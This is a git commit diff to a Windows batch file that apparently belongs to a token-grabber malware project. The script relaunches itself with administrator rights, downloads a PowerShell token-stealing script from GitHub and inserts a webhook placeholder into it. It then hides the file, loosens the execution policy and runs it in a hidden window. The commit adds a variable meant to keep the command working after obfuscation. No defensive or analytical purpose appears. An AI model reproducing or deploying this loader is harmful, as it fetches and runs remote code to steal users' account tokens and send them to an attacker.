92fa5d60f7e1475167977585ade09df43e46c43d
KDot227 <kdot227@proton.me>
2023-11-19 16:44:52 -0600

    new bat

--- main.bat
+++ main.bat
@@ -4,7 +4,8 @@ net session >nul 2>&1
 if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'" & exit /b 0)
 cd /d %~dp0
 
-powershell -c "$t = Iwr -Uri 'https://raw.githubusercontent.com/ChildrenOfYahweh/Powershell-Token-Grabber/main/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'YOUR_WEBHOOK_HERE2' | Out-File -FilePath 'powershell123.ps1' -Encoding ASCII"
+REM this "%CAPITALIZATION%" is used with somalifuscator so we can make sure that the capitalization of this command is correct or else the webhook wont work.
+%CAPITALIZATION%powershell -c "$t = Iwr -Uri 'https://raw.githubusercontent.com/ChildrenOfYahweh/Powershell-Token-Grabber/main/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'YOUR_WEBHOOK_HERE2' | Out-File -FilePath 'powershell123.ps1' -Encoding ASCII"
 attrib +h +s powershell123.ps1
 powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force
 powershell -noprofile -executionpolicy bypass -WindowStyle hidden -file powershell123.ps1
